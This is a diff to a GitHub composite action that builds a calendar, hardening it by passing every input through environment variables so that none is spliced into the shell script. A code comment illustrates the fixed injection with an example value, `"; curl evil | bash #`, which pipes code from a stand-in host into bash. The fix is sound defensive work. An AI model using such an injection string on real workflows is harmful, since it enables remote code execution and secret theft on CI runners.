@@ -101,28 +101,58 @@ runs:
         python-version: "3.12"
     - name: Generate calendar
       shell: bash
+      # **Every input arrives as an environment variable, never as `${{ }}` inside
+      # the script.** GitHub substitutes `${{ }}` as raw script text before bash
+      # parses anything, so quoting in the YAML does not contain it: an input
+      # holding `"; curl evil | bash #` would close the quote and run. This is a
+      # reusable action, so the untrusted value would come from whatever the
+      # caller wires in — a workflow_dispatch text field, say. Environment
+      # variables are expanded by the shell itself and cannot change the script's
+      # structure.
       env:
         PYTHONPATH: ${{ github.action_path }}/src
+        IN_OUT: ${{ inputs.out }}
+        IN_MONTH: ${{ inputs.month }}
+        IN_TIMEZONE: ${{ inputs.timezone }}
+        IN_LOCALE: ${{ inputs.locale }}
+        IN_WEEK_START: ${{ inputs.week_start }}
+        IN_PALETTE: ${{ inputs.palette }}
+        IN_RADIUS: ${{ inputs.radius }}
+        IN_FONT: ${{ inputs.font }}
+        IN_BORDER: ${{ inputs.border }}
+        IN_ROKUYO: ${{ inputs.rokuyo }}
+        IN_SOLAR_TERMS: ${{ inputs.solar_terms }}
+        IN_MOON: ${{ inputs.moon }}
+        IN_MOON_AGE: ${{ inputs.moon_age }}
+        IN_MOON_AMBER: ${{ inputs.moon_amber }}
+        IN_HOLIDAYS: ${{ inputs.holidays }}
+        IN_HOLIDAY_NAMES: ${{ inputs.holiday_names }}
+        IN_LUCKY_DAYS: ${{ inputs.lucky_days }}
+        IN_UNLUCKY_DAYS: ${{ inputs.unlucky_days }}
+        IN_ANNOTATION_MODE: ${{ inputs.annotation_mode }}
+        IN_COLORIZE: ${{ inputs.colorize }}
       run: |
         set -euo pipefail
-        args=(--out "${{ inputs.out }}"
-              --timezone "${{ inputs.timezone }}"
-              --locale "${{ inputs.locale }}"
-              --week-start "${{ inputs.week_start }}"
-              --palette "${{ inputs.palette }}"
-              --radius "${{ inputs.radius }}"
-              --annotation-mode "${{ inputs.annotation_mode }}")
-        [ -n "${{ inputs.month }}" ]    && args+=(--month "${{ inputs.month }}")
-        [ -n "${{ inputs.font }}" ]     && args+=(--font "${{ inputs.font }}")
-        [ -n "${{ inputs.holidays }}" ] && args+=(--holidays "${{ inputs.holidays }}")
-        [ "${{ inputs.border }}"        = "true" ] && args+=(--border)
-        [ "${{ inputs.rokuyo }}"        = "true" ] && args+=(--rokuyo)
-        [ "${{ inputs.solar_terms }}"   = "true" ] && args+=(--solar-terms)
-        [ "${{ inputs.moon }}"          = "true" ] && args+=(--moon)
-        [ "${{ inputs.moon_age }}"      = "true" ] && args+=(--moon-age)
-        [ "${{ inputs.moon_amber }}"    = "true" ] && args+=(--moon-amber)
-        [ "${{ inputs.holiday_names }}" = "true" ] && args+=(--holiday-names)
-        [ "${{ inputs.lucky_days }}"    = "true" ] && args+=(--lucky-days)
-        [ "${{ inputs.unlucky_days }}"  = "true" ] && args+=(--unlucky-days)
-        [ "${{ inputs.colorize }}"      = "true" ] && args+=(--colorize)
+        args=(--out "$IN_OUT"
+              --timezone "$IN_TIMEZONE"
+              --locale "$IN_LOCALE"
+              --week-start "$IN_WEEK_START"
+              --palette "$IN_PALETTE"
+              --radius "$IN_RADIUS"
+              --annotation-mode "$IN_ANNOTATION_MODE")
+        # `[ ... ] && args+=(...)` is safe under errexit: a command failing inside
+        # a && list does not exit the shell unless it follows the final &&.
+        [ -n "$IN_MONTH" ]    && args+=(--month "$IN_MONTH")
+        [ -n "$IN_FONT" ]     && args+=(--font "$IN_FONT")
+        [ -n "$IN_HOLIDAYS" ] && args+=(--holidays "$IN_HOLIDAYS")
+        [ "$IN_BORDER" = "true" ]        && args+=(--border)
+        [ "$IN_ROKUYO" = "true" ]        && args+=(--rokuyo)
+        [ "$IN_SOLAR_TERMS" = "true" ]   && args+=(--solar-terms)
+        [ "$IN_MOON" = "true" ]          && args+=(--moon)
+        [ "$IN_MOON_AGE" = "true" ]      && args+=(--moon-age)
+        [ "$IN_MOON_AMBER" = "true" ]    && args+=(--moon-amber)
+        [ "$IN_HOLIDAY_NAMES" = "true" ] && args+=(--holiday-names)
+        [ "$IN_LUCKY_DAYS" = "true" ]    && args+=(--lucky-days)
+        [ "$IN_UNLUCKY_DAYS" = "true" ]  && args+=(--unlucky-days)
+        [ "$IN_COLORIZE" = "true" ]      && args+=(--colorize)
         python3 -m almanac_calendar "${args[@]}"
